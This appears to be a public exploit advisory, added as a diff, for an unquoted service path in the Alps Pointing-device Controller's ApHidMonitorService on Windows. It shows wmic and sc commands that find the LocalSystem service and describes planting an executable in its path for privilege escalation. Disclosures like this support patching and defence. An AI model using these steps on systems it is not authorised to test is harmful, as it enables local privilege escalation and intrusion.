@@ -1,0 +1,31 @@
+# Exploit Title: Alps Pointing-device Controller 8.1202.1711.04 - 'ApHidMonitorService' Unquoted Service Path
+# Date: 2019-11-12
+# Exploit Author: Mario Rodriguez
+# Vendor Homepage: https://www.alps.com/e/
+# Software Link: https://www.alps.com/e/
+# Version: 8.1202.1711.04
+# Tested on: Windows 10 Home x64 Spanish
+
+#The Alps Pointing-device controller installs a service with an unquoted path
+#which could be used as a local privilege escalation vulnerability. To exploit this vulnerability,
+#an executable file could be placed in the path of the service and after rebooting the system or
+#restarting the service the malicious code will be executed with elevated privileges.
+
+#Step to discover the vulnerability
+
+C:\Users\user>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+Alps HID Monitor Service    ApHidMonitorService     C:\Program Files\Apoint2K\HidMonitorSvc.exe     Auto
+
+C:\Users\user>sc qc ApHidMonitorService
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: ApHidMonitorService
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files\Apoint2K\HidMonitorSvc.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : Alps HID Monitor Service
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
